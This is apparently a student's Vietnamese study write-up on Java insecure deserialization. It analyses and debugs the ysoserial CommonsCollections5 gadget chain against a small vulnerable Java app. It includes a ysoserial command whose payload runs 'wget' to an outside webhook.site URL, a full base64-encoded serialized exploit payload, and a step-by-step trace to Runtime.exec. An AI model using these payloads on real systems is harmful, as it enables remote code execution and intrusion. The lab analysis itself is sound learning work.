# Task 5

## Java Deserialization

serialization và deserialization:**
<ul>
    <li><b>Serialization</b>là quá trình xử lý, chuyển đổi các thuộc tính của một đối tượng thành một định dạng dữ liệu ví dụ như binary fomat, từ đó có thể lưu trên ổ đĩa, hoặc sử dụng vào các mục đích cần thiết khác, là quá trình chuyển đối của một đối tượng thành định dạng như chuỗi byte, JSON, YAML,… Mục đích chính của quá trình này để dễ dàng lưu trữ và truyền dữ liệu giữa các ứng dụng.
</li>
    <li><b>Deserialization</b> là quá trình ngược lại với serialization để chuyển từ những định dạng dữ liệu trên thành đối tượng ban đầu.
    </li>
</ul>

<img src="https://hackmd.io/_uploads/rkdUuOvFT.png">

<li>Lỗ hổng Insecure deserialization xảy ra khi kẻ tấn công có thể chỉnh sửa, thay đổi các đối tượng, dữ liệu sẽ được thực hiện Deserialize bởi ứng dụng. Họ có thể tận dụng các object sẵn có của ứng dụng, tạo ra các quá trình deserialization theo mục đích riêng, thậm chí có thể dẫn đến tấn công thực thi mã từ xa (RCE). Tấn công deserialization cũng được gọi với cái tên khác là Object injection.</li>

- nguyên nhân chính là do việc ứng dụng web để người dùng có thể kiểm soát được các dữ liệu sau khi serialize đối tượng nào đó (gọi là serialized data), khi thay đổi chúng ứng dụng sẽ thực hiện quá trình deserialization để khôi phục lại đối tượng ban đầu và đương nhiên đối tượng đó sẽ bị thay đổi và có thể gây ra ảnh hưởng tới ứng dụng

- Serialized data của Java sẽ có cấu trúc như sau
![image](https://hackmd.io/_uploads/ryB1BbOXyx.png)

- mọi thứ trong Java đều ở dưới dạng Objject ==> muốn truyền data biến qua đường mạng hay lưu vào trong database ==> cần serialize ==> Java dùng object nhiều nên bắt buộc phải dùng serialize

- hàm serialize trong Java => writeObject
- hàm deserialize trong Java ==> readObject

1 class muốn serialize được thì cần implements ```Serializable```

- trong Java có thể tùy chỉnh quá chình serialize

![image](https://hackmd.io/_uploads/HJ1kI-OmJx.png)

## gadgetchain
- Source: là điểm bắt đầu của gadgetchain. Khi deser, java sẽ gọi method readObject() của source Object.
- Sink: sau khi ghép nối các chain thì sẽ dẫn tới sink, hay cách khác, sink chính là điểm cuối của gadgetchain. Thường sink sẽ có các metod hữu ích như Reflection method invoke, file write, …
- Reflection in java: đây là 1 API của java, Reflections trong Java là một tính năng mạnh mẽ của ngôn ngữ, cho phép chương trình kiểm tra hoặc thay đổi cấu trúc của chính nó tại thời gian chạy. Tính năng này thuộc về gói java.lang.reflect và được sử dụng để làm việc với các class, methods, constructors, fields, và annotations mà không cần biết trước tại thời điểm biên dịch. Do vậy việc tìm hiểu và viết được gadgetchain phụ thuộc rất nhiều vào cái Java Reflection ![image](https://hackmd.io/_uploads/H1rhIl_mke.png)

- Method call: method A gọi method B, method A -> method B

 gadgetchain là kết quả của việc lắp ghép các method call, gán ghép các field làm sao cho nó đi theo luồng mà mình mong muốn: RCE, write file, …

## phân tích  CommonsCollections trong ysoserial

- Các gadgetchain này trông thì hơi khác nhau, nhưng đều có đặc điểm chung là lợi dụng class InvokerTransformer và InstantiateTransformer để invoke method.

![image](https://hackmd.io/_uploads/BJ1jlH2QJx.png)


```java!
java -jar ysoserial-all.jar CommonsCollections5 'wget https://webhook.site/a3c2df2e-c947-4179-93bc-b4dd16a4cd9a' | base64 -w 0
```



```
rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAPndnZXQgaHR0cHM6Ly93ZWJob29rLnNpdGUvNmMwNDhkODMtOTUwNy00Y2QyLWI1NzctM2E3MDcxMjRkYTM0dAAEZXhlY3VxAH4AMgAAAAFxAH4AN3NxAH4AJ3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eA==
```

![image](https://hackmd.io/_uploads/BJy2hIomke.png)

![image](https://hackmd.io/_uploads/Bk2PsLoQJx.png)



## Reproduce và debug

- Mã nguồn: Đây chỉ đơn giản là 1 console app thực hiện đọc và deserialize data từ input file.

```java
package org.example;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Scanner;

public class Main {
    public Main() {
    }

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the name of the file to deserialize: ");
        String filename = scanner.nextLine();

        try {
            FileInputStream fileIn = new FileInputStream(filename);
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Object obj = in.readObject();
            in.close();
            fileIn.close();
            System.out.println("Deserialized object: " + obj.toString());
        } catch (ClassNotFoundException | IOException var6) {
            var6.printStackTrace();
        }

    }
}
```
### Reproduce:
- Tạo CC5 payload bằng ysoserial và lưu vào file ysoserial_cc5.bin


![image](https://hackmd.io/_uploads/SJu-s3F7yl.png)

- Thực thi chương trình và truyền đường dẫn file ysoserial_cc5.bin vào input để thực hiện deserialize.

![image](https://hackmd.io/_uploads/S1LZ3nYQke.png)

-  Tiến trình ```mate-calc``` được khởi chạy thành công.

### Debug
- Dựa vào gadgetchain CC5 do ysoserial cung cấp, ta có thể khái quát gadgetchain như sau:

```java
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
```

- Để dễ debug, em đặt breakpoint tại hàm ```Runtime.exec()``` vì gadgetchain sẽ gọi ```mate-calc``` bằng hàm đó.


![image](https://hackmd.io/_uploads/rkIv7Ssmkg.png)

![image](https://hackmd.io/_uploads/ByUj7rjmke.png)


- Đầu tiên, khi ta muốn đọc một object đã được serialize thì ta phải sử dụng hàm ```ObjectInputStream.readObject```, ở script trên em đã viết object đó ra file tên là ```ysorial_cc5.bin``` giờ chỉ cần đọc nó và debug qua Intelij.


![image](https://hackmd.io/_uploads/SkhE-Li71x.png)

- ngay khi breakpoint dừng tại line 86, chưa cả đi hết gadgetchain nhưng calculator đã bị pop up ==> Đây là một tính năng của IntellIJ Debugger!
- Khi dừng tại breakpoint, muốn show được ra các variable thì debugger phải bằng cách nào đó lấy được các variable được khai báo trước breakpoint. Sau khi lấy được các variable dưới dạng object, và để show lại cho người dùng dưới dạng tường minh, nghĩa là dạng Human-readable ==> String
- Ở đây để có thể lấy về Object dưới dạng String, debugger đã “ngầm” invoke method toString() của object variable muốn show ra cho người dùng, như trong trường hợp hiện tại thì debugger đã lén invoke method toString() của valObject và khiến cho các chain về sau được thực thi luôn -> calc pop up!
- khi object serialize được load sẽ trace vào ```BadAttributeValueExpException#readObject()```

![image](https://hackmd.io/_uploads/HyeBebj7kx.png)


- Chúng ta có thể thấy ở phần Variables thì valObj là một TiedMapEntry object, nguyên nhân là ở phần build payload

![image](https://hackmd.io/_uploads/r1un9ZjQye.png)




- ```entry``` là một object của TiedMapEntry đã được gán vào thuộc tính val của ```BadAttributeValueExpException```. Khi trigger ```valObj.toString()``` sẽ gọi hàm ```TiedMapEntry.toString()```

![image](https://hackmd.io/_uploads/ryyP-zsXJe.png)

- Chỗ này đồng thời cũng gọi ```TiedMapEntry.getKey()``` và ```TiedMapEntry.getValue()```. Hàm ```TiedMapEntry.getValue()``` sẽ trigger hàm ```LazyMap.get()``` với key = foo


![image](https://hackmd.io/_uploads/By2YQzimkl.png)



- Tại ```LazyMap.get()```
- method LazyMap.get() ta có thể thấy luồng xử lý cơ bản của method này như sau:
    - đầu tiên là check xem this.map của Object LazyMap này có chưa key hay không
    - nếu không thì sẽ đi vào nhánh gọi this.factory.transform()
Với this.factory ở đây là object của ChainedTransformer().

![image](https://hackmd.io/_uploads/HyePNzsQ1l.png)

- dễ dàng pass được điều kiện ```super.map.containsKey(key)``` vì chỉ cần key không phải là giá trị null là được

![image](https://hackmd.io/_uploads/SJyE_fo7yx.png)

![image](https://hackmd.io/_uploads/HkrOwLi7ye.png)


- Ở đây thì phần tử thứ 0 sẽ thực hiện transform đầu tiên, phần tử này là object của ```ConstantTransformer``` sẽ thực hiện hàm ```ConstantTransformer#transform()```

![image](https://hackmd.io/_uploads/ByXsDBsX1e.png)

![image](https://hackmd.io/_uploads/rJNpwBo71g.png)

- iTransformers là một array có dạng là Transformer. Điều này có nghĩa là các object của các class inheritance từ Transformer có thể được đưa vào array iTransformers.

- Sau đó Transformer trong iTransformers array có thể được gọi trong method ChainedTransformer::transform

![image](https://hackmd.io/_uploads/HJMASUiXyg.png)


- method này sẽ gọi đến method transform() của các phần tử trong array iTransformers.



- Và lần lặp thứ nhất chỉ đơn giản là sẽ trả về một Class java.lang.Runtime là object của Class, do this.iConstant = class java.lang.Runtime và được lưu vào biến object

![image](https://hackmd.io/_uploads/H1yftSoQ1e.png)

![image](https://hackmd.io/_uploads/rJ8xUIoX1g.png)


-  kết thúc vòng gặp thứ 2 sẽ trả về ```java.lang.Runtime.getRuntime()```

![image](https://hackmd.io/_uploads/H13cFBjmyg.png)

InvokeTransformer:
method transform() của class này như sau:

```java!
public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```
    
- Các biến được sử dụng trong method này là input(arg của method transform()), iMethodName, iArg, iParamTypes được định nghĩa bằng Class Constructor

![image](https://hackmd.io/_uploads/S1ZaNr3m1l.png)

- 3 dòng chính của method transform() là:

![image](https://hackmd.io/_uploads/rJ30EHnmJl.png)

- Đầu tiên nó sẽ lấy class của input bằng method getClass() của reflection API.
Sau đó gọi đến method getMethod(). method này được sử dụng để lấy method được chỉ đỉnh của mộ class với kiểu tham số được chỉ định.

- Sau đó thực thi method invoke(), đây là method dùng để gọi method.

- Vậy ta có thể trigger ```Runtime.getRuntime().exec()``` nếu:

```java!
input = Runtime.getRuntime()
iMethodName = "exec"
iParamType = "String.class"
iArgs = "mate-calc"
```
![image](https://hackmd.io/_uploads/HkDHIIoXJx.png)



- Tiếp đến vòng lặp thứ 3 , với object = java.lang.Runtime.getRuntime(), tương ứng class của nó là java.lang.reflect.Method, class này có một hàm là invoke để thực gọi một hàm đã chỉ định, và chỗ này đã lấy hàm invoke để thực thi hàm java.lang.Runtime.getRuntime(),  hàm này được gọi sẽ trả về một object của class Runtime.


![image](https://hackmd.io/_uploads/SyhxsSi7kx.png)

![image](https://hackmd.io/_uploads/rkuvUIoX1g.png)


- Tiếp đến vòng lặp thứ 4 sẽ lấy hàm exec trong class java.lang.Runtime và thực thi với các tham số được đặt trong this.iArgs tức Runtime.exec('mate-calc') 

![image](https://hackmd.io/_uploads/SJl0jrsQye.png)

![image](https://hackmd.io/_uploads/ByPK8UjXyx.png)


==> RCE

![image](https://hackmd.io/_uploads/HknqLUsmye.png)

![image](https://hackmd.io/_uploads/BJY6ILsmye.png)

![image](https://hackmd.io/_uploads/Bk8JP8jQyg.png)

